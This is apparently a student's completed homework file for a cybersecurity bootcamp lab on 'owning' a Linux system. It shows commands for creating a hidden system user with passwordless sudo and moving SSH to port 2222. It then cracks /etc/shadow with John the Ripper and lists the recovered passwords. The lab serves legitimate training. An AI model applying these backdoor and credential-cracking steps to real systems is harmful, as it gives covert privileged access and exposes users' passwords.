## Week 6 Homework Submission File: Advanced Bash - Owning the System

Please edit this file by adding the solution commands on the line below the prompt. 

Save and submit the completed file for your homework submission.

**Step 1: Shadow People** 

1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
    - `Your solution command here`
useradd -M sysd
or
useradd --no-create-home sysd

2. Give your secret user a password: 
    - sudo passwd sysd

3. Give your secret user a system UID < 1000:
    - usermod -u 277 sysd

4. Give your secret user the same GID:
   - groupmod -g 277 sysd

5. Give your secret user full `sudo` access without the need for a password:
   -  visudo 

   user privilege specification
   sysd ALL=(ALL) NOPASSWD:ALL

6. Test that `sudo` access works without your password:
sudo ls
sudo -l

    ```

**Step 2: Smooth Sailing**

1. Edit the `sshd_config` file:

#Port 222
Port 2222
#AddressFamily any
#ListenAddress 0.0.0.0
#ListenAddress ::


I checked the port was open with -

ss -tulpn | grep 2222
netstat -tulpn | grep 2222

**Step 3: Testing Your Configuration Update**
1. Restart the SSH service:
    - sudo service sshd restart

2. Exit the `root` account:
    - ctrl + D pr Exot

3. SSH to the target machine using your `sysd` account and port `2222`:
 sysd@192.168.6.105 -p 2222

4. Use `sudo` to switch to the root user:
 sudo su

**Step 4: Crack All the Passwords**

1. SSH back to the system using your `sysd` account and port `2222`:

     sysd@192.168.6.105 -p 2222

2. Escalate your privileges to the `root` user. Use John to crack the entire `/etc/shadow` file:

    -sudo su

regarding the john crack, I have sudo privileges and so I am able to do it from sysd also.

    I know it is best to make a copy and crack that first but seeing as I am trying to have as little footprint as possible and also because I am wiping the VM afterwards-

    sudo john shadow
computer         (stallman)
freedom          (babbage)
trustno1         (mitnik)
dragon           (lovelace)
lakers           (turing)
passw0rd         (sysadmin)
home             (sysd)
Goodluck!        (student)


---

© 2020 Trilogy Education Services, a 2U, Inc. brand. All Rights Reserved.

